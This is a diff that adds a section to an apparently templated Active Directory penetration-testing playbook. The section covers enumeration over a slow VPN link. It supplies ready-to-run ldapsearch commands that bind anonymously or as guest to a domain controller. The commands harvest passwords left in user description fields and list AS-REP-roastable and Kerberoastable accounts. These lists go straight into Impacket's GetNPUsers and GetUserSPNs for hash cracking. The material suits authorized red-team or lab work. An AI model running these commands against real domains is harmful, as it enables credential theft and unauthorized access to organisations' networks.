@@ -41,6 +41,31 @@ nxc smb {{DC}} --timeroasting /loot/hashes/timeroast.txt
 
 ```
 
+## High latency / VPN — LDAP first, not RID-brute
+
+On a slow link (VPN, ~250ms RTT) NetExec's chatty per-RID lookups time out
+(`NetBIOSTimeout`). Anonymous/guest LDAP pulls the whole directory in a few big
+queries instead. If null/guest binds, prefer these:
+
+```
+# every user + description in one query (harvest creds from description/info)
+ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' '(objectClass=user)' \
+  sAMAccountName description info userPrincipalName
+# AS-REP-roastable (DONT_REQ_PREAUTH bit)
+ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' \
+  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
+# Kerberoastable (any SPN)
+ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' '(servicePrincipalName=*)' \
+  sAMAccountName servicePrincipalName
+# clock (rootDSE currentTime) — also confirms Kerberos won't skew
+ldapsearch -x -H ldap://{{DC}} -s base '' currentTime
+# guest-authenticated variant when anonymous is limited
+ldapsearch -x -H ldap://{{DC}} -D 'guest@{{DOMAIN}}' -w '' -b '{{NC}}' '(objectClass=user)' sAMAccountName
+```
+
+Build `users.txt` from the `sAMAccountName:` lines; feed the roastable/SPN lists
+straight into `GetNPUsers` / `GetUserSPNs`.
+
 ## Read this
 
 - `namingContexts` tells you every NC (config, schema, domain). You want the domain DN.
